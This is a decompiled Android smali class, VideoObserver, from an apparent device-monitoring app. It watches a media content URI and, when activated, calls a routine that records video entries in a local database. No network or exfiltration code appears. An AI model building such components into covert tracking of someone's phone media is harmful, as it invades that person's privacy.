.class public Lcom/hp/vd/module/monitor/video/VideoObserver;
.super Lcom/hp/vd/module/ActivatableContentObserverAbstract;
.source "VideoObserver.java"


# static fields
.field protected static final TAG:Ljava/lang/String; = "VideoObserver"


# instance fields
.field protected callable:Ljava/util/concurrent/Callable;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/concurrent/Callable<",
            "Ljava/lang/Void;",
            ">;"
        }
    .end annotation
.end field

.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/VideoData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ContentResolver;",
            "Landroid/net/Uri;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/VideoData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 36
    new-instance v0, Lcom/hp/vd/module/monitor/video/HandlerConstruct;

    invoke-direct {v0}, Lcom/hp/vd/module/monitor/video/HandlerConstruct;-><init>()V

    invoke-direct {p0, v0}, Lcom/hp/vd/module/ActivatableContentObserverAbstract;-><init>(Landroid/os/Handler;)V

    const/4 v0, 0x0

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->contentResolver:Landroid/content/ContentResolver;

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->contentUri:Landroid/net/Uri;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 24
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 26
    iput-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->callable:Ljava/util/concurrent/Callable;

    .line 38
    iput-object p1, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->contentResolver:Landroid/content/ContentResolver;

    .line 39
    iput-object p2, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->contentUri:Landroid/net/Uri;

    .line 40
    iput-object p3, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 41
    iput-object p4, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 42
    iput-object p5, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 43
    iput-object p6, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 45
    new-instance p1, Lcom/hp/vd/module/monitor/video/VideoCallable;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->contentResolver:Landroid/content/ContentResolver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->contentUri:Landroid/net/Uri;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v8, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    move-object v1, p1

    move-object v6, p0

    invoke-direct/range {v1 .. v8}, Lcom/hp/vd/module/monitor/video/VideoCallable;-><init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/video/VideoObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object p1, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->callable:Ljava/util/concurrent/Callable;

    return-void
.end method


# virtual methods
.method public onChange(Z)V
    .locals 3

    .line 58
    invoke-super {p0, p1}, Lcom/hp/vd/module/ActivatableContentObserverAbstract;->onChange(Z)V

    .line 60
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/video/VideoObserver;->isActivated()Z

    move-result p1

    if-nez p1, :cond_0

    return-void

    .line 64
    :cond_0
    iget-object p1, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "VideoObserver"

    const-string v1, "onChange(): about to start Callable::call()."

    invoke-interface {p1, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 67
    :try_start_0
    iget-object p1, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->callable:Ljava/util/concurrent/Callable;

    invoke-interface {p1}, Ljava/util/concurrent/Callable;->call()Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    .line 70
    iget-object v0, p0, Lcom/hp/vd/module/monitor/video/VideoObserver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "VideoObserver"

    const-string v2, "Exception caught durring callable.call()."

    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
